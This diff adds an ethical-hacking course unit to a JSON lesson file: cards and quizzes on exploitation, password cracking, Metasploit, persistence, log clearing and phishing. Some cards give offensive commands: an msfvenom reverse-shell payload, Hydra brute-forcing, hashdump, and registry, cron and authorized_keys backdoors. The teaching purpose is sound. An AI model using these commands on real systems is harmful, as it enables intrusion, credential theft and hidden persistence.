@@ -1,5 +1,5 @@
 {
-  "version": 16,
+  "version": 17,
   "units": [
     {
       "id": "unit_01",
@@ -3799,6 +3799,608 @@
             ],
             "correct_index": 1,
             "explanation": "Because bridged VMs are visible on the real LAN, scanning or exploiting anything outside your own authorised lab machines is illegal and unethical."
+          }
+        }
+      ]
+    }
+  ]
+},
+{
+  "id": "unit_09",
+  "title": "Unit 9: Gaining Access, Maintaining Access, Covering Tracks & Social Engineering",
+  "description": "Completing the ethical hacking lifecycle — exploitation, password cracking, Metasploit, persistence, anti-forensics, malware, and social engineering awareness.",
+  "modules": [
+    {
+      "id": "u9_m1",
+      "title": "Gaining Access: Exploits & Password Cracking",
+      "description": "Turning a discovered vulnerability into real, working access.",
+      "is_pro": false,
+      "lessons": [
+        {
+          "id": "u9_m1_l1",
+          "title": "What is Gaining Access?",
+          "cards": [
+            {
+              "id": "u9_m1_l1_c1",
+              "title": "The Third Phase",
+              "body": "Gaining Access is the third phase of ethical hacking — actually exploiting a discovered vulnerability to enter a system. It builds directly on the Scanning phase's findings and is the point where a test moves from 'what's exposed' to 'what can actually be exploited'. Success proves a vulnerability is real, not just theoretical. It's the most legally sensitive phase — always requires explicit, written authorisation."
+            },
+            {
+              "id": "u9_m1_l1_c2",
+              "title": "Types of Exploits",
+              "body": "Remote Exploit: attacks a vulnerability over a network without prior access. Local Exploit: requires existing limited access, used to escalate privileges. Client-Side Exploit: targets vulnerabilities in client applications (browsers, PDF readers) via user interaction. Server-Side Exploit: directly targets a vulnerable service running on a server."
+            },
+            {
+              "id": "u9_m1_l1_c3",
+              "title": "From Vulnerability to Access",
+              "body": "The typical flow: 1. Vulnerability Found (Scanning identifies a weakness). 2. Select Exploit (choose a matching exploit/technique). 3. Configure Payload (prepare what runs after access is gained). 4. Launch Exploit (execute against the authorised target). 5. Access Gained (a session/shell on the target is established)."
+            }
+          ],
+          "quiz": {
+            "question": "What is the key difference between a Remote Exploit and a Local Exploit?",
+            "options": [
+              "Remote exploits only work on web browsers",
+              "A Remote Exploit attacks over the network without prior access; a Local Exploit requires existing limited access to escalate privileges",
+              "There is no difference",
+              "Local exploits only target servers"
+            ],
+            "correct_index": 1,
+            "explanation": "Remote exploits gain initial access from outside the system, while local exploits are used to escalate privileges once some access already exists."
+          }
+        },
+        {
+          "id": "u9_m1_l2",
+          "title": "Password Cracking Fundamentals",
+          "cards": [
+            {
+              "id": "u9_m1_l2_c1",
+              "title": "Password Cracking Overview & Techniques",
+              "body": "Password cracking recovers passwords from stored or captured data — often the weakest link. Techniques: Brute Force (systematically tries every character combination), Dictionary Attack (tries common words and known leaked passwords), Rainbow Table Attack (uses precomputed hash tables to reverse-lookup a password), and Hybrid Attack (combines dictionary words with common variations like added numbers/symbols)."
+            },
+            {
+              "id": "u9_m1_l2_c2",
+              "title": "Online vs Offline Password Attacks",
+              "body": "Online attacks target a live login service (e.g. SSH, web login) — slower, limited by network and lockout policies, and often logged (example tool: Hydra). Offline attacks target a stolen/captured password hash file — much faster, limited only by computing power, and invisible to the target once the hash is obtained (example tools: John the Ripper, Hashcat)."
+            }
+          ],
+          "quiz": {
+            "question": "Why are offline password attacks generally faster than online attacks?",
+            "options": [
+              "Offline attacks use less electricity",
+              "Offline attacks are limited only by computing power, not by network speed or account lockout policies",
+              "Online attacks always use stronger encryption",
+              "There's no actual speed difference"
+            ],
+            "correct_index": 1,
+            "explanation": "Offline attacks work against a captured hash file locally, so they aren't slowed by network latency or protected by account lockout mechanisms the way online attacks against a live service are."
+          }
+        },
+        {
+          "id": "u9_m1_l3",
+          "title": "Password Cracking Tools",
+          "cards": [
+            {
+              "id": "u9_m1_l3_c1",
+              "title": "John the Ripper",
+              "body": "A versatile offline password cracker supporting many hash formats. 'john hashes.txt' cracks using default settings. 'john --wordlist=rockyou.txt hashes.txt' runs a dictionary attack. 'john --show hashes.txt' displays already-cracked passwords. 'john --incremental hashes.txt' runs a full brute-force. Format flags like '--format=nt' (Windows NTLM) or '--format=bcrypt' target specific hash types."
+            },
+            {
+              "id": "u9_m1_l3_c2",
+              "title": "Hashcat",
+              "body": "An extremely fast, GPU-accelerated password recovery tool. Attack modes: -a 0 (straight dictionary attack), -a 1 (combination of two wordlists), -a 3 (brute-force/mask attack), -a 6/-a 7 (hybrid wordlist+mask combinations). Example: 'hashcat -m 0 -a 0 hashes.txt rockyou.txt' runs a dictionary attack against MD5 hashes (mode 0)."
+            },
+            {
+              "id": "u9_m1_l3_c3",
+              "title": "Hydra & Alternative Brute-Force Tools",
+              "body": "Hydra is an online password-guessing tool: 'hydra -l admin -P rockyou.txt ssh://192.168.1.10' brute-forces an SSH login. Medusa is a fast, parallel, modular alternative supporting many services. Ncrack, built by the Nmap team, focuses on network authentication testing at scale and integrates naturally with Nmap output. CrackMapExec/NetExec tests credentials across entire subnets, e.g. 'nxc smb 192.168.1.0/24 -u admin -p Password123'."
+            }
+          ],
+          "quiz": {
+            "question": "Which tool is specifically designed for GPU-accelerated offline password cracking?",
+            "options": [
+              "Hydra",
+              "Hashcat",
+              "WHOIS",
+              "Wireshark"
+            ],
+            "correct_index": 1,
+            "explanation": "Hashcat is built to leverage GPU acceleration, making it extremely fast for offline hash cracking compared to CPU-based tools."
+          }
+        },
+        {
+          "id": "u9_m1_l4",
+          "title": "Rainbow Tables & Ethical Boundaries",
+          "cards": [
+            {
+              "id": "u9_m1_l4_c1",
+              "title": "Ophcrack & Rainbow Tables",
+              "body": "Ophcrack is a free tool specialised in cracking Windows passwords using precomputed rainbow tables, which trade disk space for speed by avoiding repeated hash computation. It comes with free tables for older LM hashes, with larger tables available for purchase. Modern Windows systems (NTLM with salting-like protections) are far more resistant than legacy LM hashes — salting is why rainbow table attacks are largely defeated on modern systems."
+            },
+            {
+              "id": "u9_m1_l4_c2",
+              "title": "Password Cracking — Ethical Use & Legal Boundaries",
+              "body": "Legitimate use is auditing your own organisation's password strength with proper authorisation. Cracking passwords you don't own or lack permission to test is a criminal offence. Even in authorised tests, cracked passwords must be handled confidentially. Practice only against your own accounts or designated lab material — this is exactly why strong, unique passwords matter so much."
+            }
+          ],
+          "quiz": {
+            "question": "Why are rainbow table attacks largely defeated on modern Windows systems?",
+            "options": [
+              "Modern Windows doesn't use passwords at all",
+              "Salting-like protections on NTLM make precomputed tables far less effective than on legacy LM hashes",
+              "Rainbow tables no longer exist",
+              "Windows blocks all password cracking tools automatically"
+            ],
+            "correct_index": 1,
+            "explanation": "Salting adds unique data to each password before hashing, which defeats the whole point of a precomputed rainbow table lookup."
+          }
+        }
+      ]
+    },
+    {
+      "id": "u9_m2",
+      "title": "Gaining Access: Metasploit & Exploitation Tools",
+      "description": "Using the industry-standard exploitation framework and its supporting tools.",
+      "is_pro": false,
+      "lessons": [
+        {
+          "id": "u9_m2_l1",
+          "title": "Metasploit Deep Dive",
+          "cards": [
+            {
+              "id": "u9_m2_l1_c1",
+              "title": "Core Components",
+              "body": "Exploit: code that takes advantage of a specific vulnerability. Payload: code that runs on the target after successful exploitation. Auxiliary Module: supporting functions like scanning, fuzzing, or denial-of-service testing. Encoder: helps a payload avoid detection by security tools, used carefully and ethically."
+            },
+            {
+              "id": "u9_m2_l1_c2",
+              "title": "Payloads & Meterpreter",
+              "body": "A payload defines what happens once an exploit succeeds — from a simple command shell to full control. Meterpreter is Metasploit's advanced payload: an interactive, in-memory post-exploitation tool allowing file system navigation, screenshots, and system information gathering. It runs entirely in memory, making it harder to detect than traditional disk-based payloads."
+            },
+            {
+              "id": "u9_m2_l1_c3",
+              "title": "A Sample Metasploit Workflow",
+              "body": "1. search — find a module for the known vulnerability. 2. use — select the exploit module. 3. set RHOSTS — configure the authorised target IP. 4. set PAYLOAD — choose what runs after exploitation. 5. exploit — launch against the authorised lab target."
+            }
+          ],
+          "quiz": {
+            "question": "Why is Meterpreter considered harder to detect than a traditional payload?",
+            "options": [
+              "It uses a different color scheme",
+              "It runs entirely in memory rather than being written to disk",
+              "It doesn't communicate with the attacker at all",
+              "It only works on Linux"
+            ],
+            "correct_index": 1,
+            "explanation": "Because Meterpreter operates in-memory rather than writing files to disk, it leaves fewer traditional forensic traces for antivirus and disk-scanning tools to catch."
+          }
+        },
+        {
+          "id": "u9_m2_l2",
+          "title": "msfconsole & Meterpreter Commands",
+          "cards": [
+            {
+              "id": "u9_m2_l2_c1",
+              "title": "msfconsole Essentials",
+              "body": "'search type:exploit platform:windows smb' searches for matching exploit modules. 'use exploit/windows/smb/ms17_010_eternalblue' selects a specific module. 'show options' lists all configurable options for the selected module. 'set RHOSTS 192.168.1.20' sets the target host. 'info' displays detailed information about the current module."
+            },
+            {
+              "id": "u9_m2_l2_c2",
+              "title": "Meterpreter Commands & Post-Exploitation Workflow",
+              "body": "'sysinfo' displays basic target system info. 'getuid' shows the current privilege context. 'ps' lists running processes (for migration). 'screenshot' captures the target's desktop. 'hashdump' dumps password hashes for offline cracking. Typical workflow: sysinfo → getuid → ps/migrate → hashdump → download/upload files."
+            }
+          ],
+          "quiz": {
+            "question": "Which Meterpreter command would you run to extract password hashes for later offline cracking?",
+            "options": [
+              "sysinfo",
+              "screenshot",
+              "hashdump",
+              "getuid"
+            ],
+            "correct_index": 2,
+            "explanation": "'hashdump' extracts password hashes stored on the compromised target, which can then be cracked offline with tools like John the Ripper or Hashcat."
+          }
+        },
+        {
+          "id": "u9_m2_l3",
+          "title": "msfvenom, Resource Scripts & Armitage",
+          "cards": [
+            {
+              "id": "u9_m2_l3_c1",
+              "title": "msfvenom — Generating Custom Payloads",
+              "body": "msfvenom generates standalone payloads. 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe' generates a Windows reverse-shell executable. Similar commands generate Linux ELF binaries or PHP web-shells by changing the payload and format flags."
+            },
+            {
+              "id": "u9_m2_l3_c2",
+              "title": "Resource Scripts & Armitage",
+              "body": "Resource scripts (.rc files) contain a sequence of msfconsole commands to run automatically — launch with 'msfconsole -r myscript.rc' to replay an entire exploitation sequence instantly, useful for repeatable lab exercises. Armitage is a graphical front-end for Metasploit that visualises targets and available attacks as icons, useful for teaching, though most professionals still work primarily in msfconsole."
+            }
+          ],
+          "quiz": {
+            "question": "What is the purpose of an msfconsole resource script (.rc file)?",
+            "options": [
+              "To store captured passwords",
+              "To replay a sequence of msfconsole commands automatically, standardising a repeatable workflow",
+              "To encrypt Meterpreter traffic",
+              "To generate wordlists"
+            ],
+            "correct_index": 1,
+            "explanation": "Resource scripts turn a manual, multi-step process into a single, repeatable, auditable command sequence — useful for demos and consistent testing."
+          }
+        },
+        {
+          "id": "u9_m2_l4",
+          "title": "Real-World Exploits & Other Tools",
+          "cards": [
+            {
+              "id": "u9_m2_l4_c1",
+              "title": "EternalBlue & Privilege Escalation",
+              "body": "EternalBlue (MS17-010) was a famous Windows SMB vulnerability exploited in the 2017 WannaCry ransomware outbreak, allowing remote code execution without user interaction. Once initial access is gained, attackers often only have limited privileges — Privilege Escalation is the process of gaining higher-level access. Vertical escalation moves from low to high privilege; horizontal escalation gains access to another account at the same privilege level."
+            },
+            {
+              "id": "u9_m2_l4_c2",
+              "title": "SQLmap, BeEF, Searchsploit & Netcat",
+              "body": "SQLmap automates detecting and exploiting SQL injection: 'sqlmap -u \"http://target/page?id=1\" --dbs' lists databases once injection is confirmed. BeEF (Browser Exploitation Framework) exploits web browsers via a 'hooked' JavaScript payload after an XSS flaw. Searchsploit searches a local Exploit-DB copy: 'searchsploit apache 2.4'. Netcat creates reverse/bind shells: 'nc -lvnp 4444' listens for an incoming connection."
+            }
+          ],
+          "quiz": {
+            "question": "What made EternalBlue (MS17-010) especially dangerous?",
+            "options": [
+              "It required the victim to open a phishing email",
+              "It allowed remote code execution on unpatched Windows systems without any user interaction",
+              "It only worked on Linux servers",
+              "It was never actually exploited in the wild"
+            ],
+            "correct_index": 1,
+            "explanation": "EternalBlue allowed attackers to remotely execute code on vulnerable, unpatched Windows systems with zero user interaction required, which is why it spread so devastatingly fast in the WannaCry outbreak."
+          }
+        }
+      ]
+    },
+    {
+      "id": "u9_m3",
+      "title": "Maintaining Access: Backdoors & Persistence",
+      "description": "How attackers ensure access survives reboots and time — and how defenders detect it.",
+      "is_pro": false,
+      "lessons": [
+        {
+          "id": "u9_m3_l1",
+          "title": "Backdoors & Why Attackers Persist",
+          "cards": [
+            {
+              "id": "u9_m3_l1_c1",
+              "title": "What is Maintaining Access?",
+              "body": "The fourth phase of ethical hacking — ensuring continued access to a compromised system over time. Without persistence, access could be lost the moment the system reboots or a session drops. Re-exploiting a vulnerability every time is slow, noisy, and may not always work again — persistence enables longer-term objectives like data exfiltration, espionage, or ransomware deployment. Advanced Persistent Threats (APTs) rely heavily on long-term persistence."
+            },
+            {
+              "id": "u9_m3_l1_c2",
+              "title": "Types of Backdoors",
+              "body": "A backdoor is a hidden method of bypassing normal authentication. Software Backdoor: a hidden program or modified application providing covert remote access. Web Shell: a malicious script uploaded to a web server, providing command execution via a browser. Hardware Backdoor: a physical device or firmware modification. Account Backdoor: a hidden or additional user account created for repeated authorised-looking access."
+            }
+          ],
+          "quiz": {
+            "question": "Why do attackers seek persistence rather than just re-exploiting a vulnerability each time?",
+            "options": [
+              "Re-exploitation is illegal but persistence is legal",
+              "Re-exploiting is slow, noisy, and may not always work again — persistence enables continued access without repeating the entire attack",
+              "Persistence is required by the vulnerability itself",
+              "There is no advantage to persistence"
+            ],
+            "correct_index": 1,
+            "explanation": "Persistence lets an attacker skip the risky, noisy re-exploitation step and instead maintain reliable ongoing access for longer-term objectives."
+          }
+        },
+        {
+          "id": "u9_m3_l2",
+          "title": "Persistence Techniques",
+          "cards": [
+            {
+              "id": "u9_m3_l2_c1",
+              "title": "Common Persistence Techniques",
+              "body": "Startup/Registry Entries: adds a program to run automatically at boot (Windows Run keys). Scheduled Tasks/Cron Jobs: configures the OS to periodically re-launch malicious code. Malicious Services: installs a disguised service running continuously in the background. SSH Key Injection: adds an attacker's SSH key to authorized_keys for passwordless remote access."
+            },
+            {
+              "id": "u9_m3_l2_c2",
+              "title": "Concrete Persistence Commands",
+              "body": "Windows: 'reg add HKCU\\...\\Run /v Update /t REG_SZ /d C:\\payload.exe' adds a registry Run key; 'schtasks /create /tn Update /tr payload.exe /sc onlogon' creates a scheduled task at logon. Linux: 'crontab -e' with '@reboot /path/payload.sh' runs a script every reboot; 'echo \"attacker_key\" >> ~/.ssh/authorized_keys' adds a passwordless SSH key; 'systemctl enable malicious.service' registers a disguised auto-starting service."
+            }
+          ],
+          "quiz": {
+            "question": "Which Linux persistence technique allows an attacker passwordless remote login?",
+            "options": [
+              "Editing /etc/hostname",
+              "Adding the attacker's public key to ~/.ssh/authorized_keys",
+              "Running 'ls -la'",
+              "Installing a browser extension"
+            ],
+            "correct_index": 1,
+            "explanation": "Appending an attacker's SSH public key to authorized_keys grants them passwordless SSH access to the system from then on."
+          }
+        },
+        {
+          "id": "u9_m3_l3",
+          "title": "Rootkits, C2 & Advanced Persistence Tools",
+          "cards": [
+            {
+              "id": "u9_m3_l3_c1",
+              "title": "Rootkits & Command and Control",
+              "body": "Rootkits are stealthy malware hiding deep within the operating system, actively concealing the attacker's presence — hiding files, processes, network connections, and even other persistence mechanisms. Kernel-level rootkits operate below where most security tools look. A Command & Control (C2) channel lets an attacker remotely control a compromised system; compromised machines periodically 'call home' to a C2 server, and modern C2 traffic often disguises itself as normal web traffic."
+            },
+            {
+              "id": "u9_m3_l3_c2",
+              "title": "Netcat, Weevely & Post-Exploitation Frameworks",
+              "body": "A simple netcat listener combined with a scheduled task creates a basic persistent backdoor, though it's easy to detect once known. Weevely generates a stealthy, obfuscated PHP web shell communicating over standard HTTP requests. Post-exploitation frameworks like PowerShell Empire, Covenant, and Sliver offer more advanced, disguised persistence and C2 capabilities — Cobalt Strike is the commercial, professional-grade option widely used in red teaming."
+            }
+          ],
+          "quiz": {
+            "question": "What is the main purpose of a Command & Control (C2) channel?",
+            "options": [
+              "To encrypt files for ransom",
+              "To let an attacker remotely direct a compromised system after it 'calls home'",
+              "To scan for open ports",
+              "To perform a WHOIS lookup"
+            ],
+            "correct_index": 1,
+            "explanation": "A C2 channel is the attacker's remote control mechanism, letting them issue new instructions to compromised machines that periodically check in."
+          }
+        },
+        {
+          "id": "u9_m3_l4",
+          "title": "Detecting Persistence & Ethics",
+          "cards": [
+            {
+              "id": "u9_m3_l4_c1",
+              "title": "Detecting Persistence & Backdoors",
+              "body": "Defenders should regularly audit startup entries, scheduled tasks, and running services for anything unfamiliar. Tools include Autoruns (Sysinternals) which lists every program configured to start automatically on Windows, chkrootkit/rkhunter which scan Linux systems for known rootkit signatures, and network monitoring (Wireshark) to identify unusual outbound connections indicating possible C2 traffic. File Integrity Monitoring and EDR tools also help catch what simple antivirus signatures miss."
+            },
+            {
+              "id": "u9_m3_l4_c2",
+              "title": "Maintaining Access — Ethical Boundaries",
+              "body": "Installing any backdoor or persistence mechanism requires explicit, written authorisation. Authorised tests must document every persistence mechanism installed, for complete removal afterward. Leaving any backdoor in place after a test concludes is a serious professional and legal violation. Professional reports always include full remediation steps for anything installed during testing."
+            }
+          ],
+          "quiz": {
+            "question": "What must a penetration tester do with any backdoor or persistence mechanism installed during an authorised test?",
+            "options": [
+              "Leave it in place for future re-testing",
+              "Fully document it and remove it after the test concludes",
+              "Sell it to the highest bidder",
+              "Nothing — it's not their responsibility"
+            ],
+            "correct_index": 1,
+            "explanation": "Leaving any installed backdoor in place after a test is a serious legal and professional violation — everything must be documented and removed."
+          }
+        }
+      ]
+    },
+    {
+      "id": "u9_m4",
+      "title": "Covering Tracks",
+      "description": "The final phase — how attackers erase evidence, and why logging must be tamper-resistant.",
+      "is_pro": false,
+      "lessons": [
+        {
+          "id": "u9_m4_l1",
+          "title": "What is Covering Tracks?",
+          "cards": [
+            {
+              "id": "u9_m4_l1_c1",
+              "title": "The Final Phase",
+              "body": "Covering Tracks is the fifth and final phase of the ethical hacking lifecycle — erasing evidence of an intrusion. Attackers attempt to remove or alter logs, files, and other traces of their activity, with the goal of avoiding detection and making forensic investigation as difficult as possible. This directly opposes the Integrity and Non-Repudiation principles — this is where they're tested."
+            },
+            {
+              "id": "u9_m4_l1_c2",
+              "title": "Why Attackers Cover Their Tracks",
+              "body": "Extends the duration of undetected access, maximising time for the attacker's objectives. Makes incident response and forensic investigation slower and less conclusive. Can obscure the true scope of a breach, and complicates attribution — making it harder to identify who was responsible. A hallmark of sophisticated, patient attackers rather than opportunistic ones."
+            }
+          ],
+          "quiz": {
+            "question": "Which security principles does Covering Tracks most directly attack?",
+            "options": [
+              "Availability and Confidentiality",
+              "Integrity and Non-Repudiation",
+              "Authentication and Authorization",
+              "None — it doesn't relate to any security principle"
+            ],
+            "correct_index": 1,
+            "explanation": "Covering Tracks attempts to falsify or erase logs, which directly undermines Integrity (data being accurate/untampered) and Non-Repudiation (proving what actually happened)."
+          }
+        },
+        {
+          "id": "u9_m4_l2",
+          "title": "Log Clearing & Hiding Activities",
+          "cards": [
+            {
+              "id": "u9_m4_l2_c1",
+              "title": "Log Clearing Techniques",
+              "body": "Log clearing involves deleting or modifying system logs to remove evidence. It can target application, system event, authentication, or firewall logs. Complete log deletion is often itself a red flag — investigators notice suspicious gaps. Techniques: Event Log Clearing (deleting Windows Event Viewer or Linux syslog entries), Selective Log Editing (removing only specific entries), Timestomping (altering file timestamps), and Log Rotation Abuse (forcing premature log rotation to push old evidence out of retention)."
+            },
+            {
+              "id": "u9_m4_l2_c2",
+              "title": "Hiding Activities",
+              "body": "Beyond clearing logs, attackers try to hide malicious files and processes themselves, often combined with rootkit techniques. Techniques: Hidden Files/Directories (using OS features like dot-files or the hidden attribute), Alternate Data Streams (hiding data within an NTFS file's alternate stream), Steganography (concealing data within an innocent-looking image), and Process Masquerading (naming malicious processes to resemble legitimate ones)."
+            }
+          ],
+          "quiz": {
+            "question": "Why is a completely empty log file often MORE suspicious to investigators than a normal one?",
+            "options": [
+              "Empty logs are always a sign of good security",
+              "A total absence of expected log entries is itself a red flag indicating deliberate tampering",
+              "Investigators never check log files",
+              "Empty logs mean the system was never used"
+            ],
+            "correct_index": 1,
+            "explanation": "Because logs are expected to contain routine activity, a complete gap or empty file stands out as unusual and often prompts closer investigation."
+          }
+        },
+        {
+          "id": "u9_m4_l3",
+          "title": "Anti-Forensics & Defence",
+          "cards": [
+            {
+              "id": "u9_m4_l3_c1",
+              "title": "Anti-Forensics & Protecting Logs",
+              "body": "Anti-forensics refers to any technique designed to obstruct or mislead a forensic investigation — including log clearing, hiding activity, timestomping, encryption of malicious artifacts, and even planting misleading evidence. Defence: audit logs should be centralised, tamper-evident, and separate from the systems they monitor. Sending logs to a remote, write-restricted SIEM prevents an attacker from editing them locally — 'if logs live only on the compromised system, they were never truly safe to begin with.'"
+            },
+            {
+              "id": "u9_m4_l3_c2",
+              "title": "Covering Tracks — Ethical Boundaries",
+              "body": "Real log tampering, even during an authorised test, requires very explicit prior agreement. Most engagements explicitly PROHIBIT actual log clearing to preserve the client's own audit trail — testers instead document what COULD have been hidden, without actually destroying real evidence. Understanding this phase is about recognition and defence, not about actually erasing anything."
+            }
+          ],
+          "quiz": {
+            "question": "Why does sending logs to a remote, centralised SIEM defend against Covering Tracks?",
+            "options": [
+              "It makes logs load faster",
+              "An attacker who compromises the local system can't edit logs that already live elsewhere and are write-restricted",
+              "SIEMs automatically delete old logs",
+              "It has no defensive value"
+            ],
+            "correct_index": 1,
+            "explanation": "If logs are immediately shipped off to a separate, write-restricted system, an attacker who compromises the local machine can no longer tamper with the evidence already stored elsewhere."
+          }
+        }
+      ]
+    },
+    {
+      "id": "u9_m5",
+      "title": "Malware & Social Engineering",
+      "description": "The software and human techniques that run through every phase of a real attack.",
+      "is_pro": false,
+      "lessons": [
+        {
+          "id": "u9_m5_l1",
+          "title": "Malware Across the Attack Lifecycle",
+          "cards": [
+            {
+              "id": "u9_m5_l1_c1",
+              "title": "Malware's Role in Every Phase",
+              "body": "Malware can deliver the exploit (Gaining Access), provide the backdoor (Maintaining Access), or hide itself (Covering Tracks). Malware types map to lifecycle roles: Trojan (often delivers the initial payload), Rootkit (provides stealth during Maintaining Access/Covering Tracks), Ransomware (the final-stage payload, often the ultimate objective), Spyware (gathers information continuously), and Botnet Malware (enables C2 across many devices at once)."
+            },
+            {
+              "id": "u9_m5_l1_c2",
+              "title": "How Malware Spreads",
+              "body": "Email attachments and malicious links remain the most common infection vector. Other vectors: infected removable media (USB drives), drive-by downloads from compromised websites, bundling with pirated or 'free' software, and directly exploiting unpatched vulnerabilities without any user interaction at all. Most malware still needs a human action to begin — which is exactly why awareness matters."
+            }
+          ],
+          "quiz": {
+            "question": "What remains the most common infection vector for malware?",
+            "options": [
+              "Physical hardware failure",
+              "Email attachments and malicious links",
+              "Weather events",
+              "Government intervention"
+            ],
+            "correct_index": 1,
+            "explanation": "Despite advances in technical defences, email attachments and malicious links remain the single most common way malware initially spreads."
+          }
+        },
+        {
+          "id": "u9_m5_l2",
+          "title": "Malware Analysis & Awareness",
+          "cards": [
+            {
+              "id": "u9_m5_l2_c1",
+              "title": "Static vs Dynamic Analysis",
+              "body": "Static Analysis examines the malware's code/file without ever running it — safe, but can miss behaviour only visible at runtime. Dynamic Analysis runs the malware in an isolated 'sandbox' environment and observes its behaviour — more insightful, but requires strict isolation to stay safe."
+            },
+            {
+              "id": "u9_m5_l2_c2",
+              "title": "Signs of Infection & Ransomware",
+              "body": "Warning signs: unusually slow performance or frequent crashes, programs opening/installing without your action, unfamiliar processes or a spike in outbound network activity, antivirus being unexpectedly disabled, and files becoming encrypted or inaccessible without explanation. Ransomware is typically the FINAL payload after all earlier phases have already occurred — modern ransomware often steals data first ('double extortion') before encrypting it. Reliable recovery without payment requires strong, offline backups."
+            }
+          ],
+          "quiz": {
+            "question": "By the time ransomware activates and encrypts files, what has usually already happened?",
+            "options": [
+              "Nothing — ransomware is always the very first step of an attack",
+              "The attacker has typically already completed all five phases of the attack lifecycle",
+              "The victim has already paid the ransom",
+              "The malware has been fully removed"
+            ],
+            "correct_index": 1,
+            "explanation": "Ransomware is usually the final, visible payload — by the time it activates, the attacker has typically already gained access, maintained it, and often covered their tracks."
+          }
+        },
+        {
+          "id": "u9_m5_l3",
+          "title": "Social Engineering Fundamentals",
+          "cards": [
+            {
+              "id": "u9_m5_l3_c1",
+              "title": "What is Social Engineering?",
+              "body": "The art of manipulating people into breaking normal security procedures or revealing information. It exploits human psychology — trust, urgency, fear, curiosity — rather than technical vulnerabilities, and is often the easiest and most reliable way to gain initial access, bypassing technical defences entirely. 'There is no patch for human nature.'"
+            },
+            {
+              "id": "u9_m5_l3_c2",
+              "title": "Common Social Engineering Techniques",
+              "body": "Pretexting: inventing a believable false scenario to extract information (e.g. posing as IT support). Baiting: offering something enticing (free USB, download) that delivers malware when used. Tailgating: physically following an authorised person through a secure door. Quid Pro Quo: offering a fake service or favour in exchange for information or access."
+            }
+          ],
+          "quiz": {
+            "question": "What is 'Tailgating' in social engineering?",
+            "options": [
+              "Sending a fraudulent email",
+              "Physically following an authorised person through a secure door without your own access",
+              "Guessing a password",
+              "Scanning a network for open ports"
+            ],
+            "correct_index": 1,
+            "explanation": "Tailgating is a physical social engineering technique where an attacker follows someone with legitimate access through a secured entry point."
+          }
+        },
+        {
+          "id": "u9_m5_l4",
+          "title": "Phishing Deep Dive",
+          "cards": [
+            {
+              "id": "u9_m5_l4_c1",
+              "title": "Anatomy of a Phishing Email",
+              "body": "Phishing combines urgency, authority, and familiarity to bypass a victim's natural caution, and is the single most common initial access technique in real-world breaches. Key elements: Urgency & Fear ('your account will be suspended in 24 hours'), False Authority (impersonating a bank or official), Deceptive Links (display text hiding a different actual URL), and Lookalike Branding (copying real logos and formatting almost perfectly)."
+            },
+            {
+              "id": "u9_m5_l4_c2",
+              "title": "Spear Phishing vs Mass Phishing",
+              "body": "Mass Phishing is sent broadly to thousands of random recipients, generic with often obvious errors, lower success rate per-message but scale compensates. Spear Phishing is carefully targeted at a specific individual or organisation, highly personalised using researched details (OSINT), with a much higher success rate per-message due to credibility — for example, an email referencing your actual manager's name and a real project."
+            }
+          ],
+          "quiz": {
+            "question": "What makes Spear Phishing more dangerous than generic Mass Phishing?",
+            "options": [
+              "It's sent to more people at once",
+              "It's highly personalised using researched details, making it far more credible and harder to spot",
+              "It never contains any links",
+              "It only targets computers, not people"
+            ],
+            "correct_index": 1,
+            "explanation": "Spear phishing uses researched, personal details (often gathered via OSINT) to make the message far more believable, dramatically increasing its success rate compared to generic mass phishing."
+          }
+        },
+        {
+          "id": "u9_m5_l5",
+          "title": "Defense & Building Resilience",
+          "cards": [
+            {
+              "id": "u9_m5_l5_c1",
+              "title": "Defending Against Social Engineering",
+              "body": "Pause before acting on urgency — legitimate requests can withstand a moment of verification. Verify unusual requests through a separate, known communication channel (call, don't reply). Check sender addresses and links carefully — hover before you click. Be cautious about what you share publicly, since it can become ammunition for a targeted attack. Report suspected phishing immediately rather than deleting it silently."
+            },
+            {
+              "id": "u9_m5_l5_c2",
+              "title": "Building Resilience — Personal & Organisational",
+              "body": "You are the last line of defence technology alone cannot replace — treat every unexpected urgent request with healthy scepticism and keep your personal OSINT footprint minimal. No single control fully stops social engineering; resilience comes from layered, ongoing effort: regular security awareness training, clear blame-free reporting channels, and technical controls like email gateways — combined, not alone."
+            }
+          ],
+          "quiz": {
+            "question": "What is the recommended way to verify an unusual, urgent request (e.g. a wire transfer email from your 'manager')?",
+            "options": [
+              "Reply immediately to the same email to confirm",
+              "Verify through a separate, known communication channel, such as calling the person directly",
+              "Forward it to more people to double check",
+              "Comply immediately since it claims to be urgent"
+            ],
+            "correct_index": 1,
+            "explanation": "Verifying through a separate, already-trusted channel (like a phone call) prevents an attacker who has spoofed or compromised the original channel from successfully impersonating someone."
           }
         }
       ]
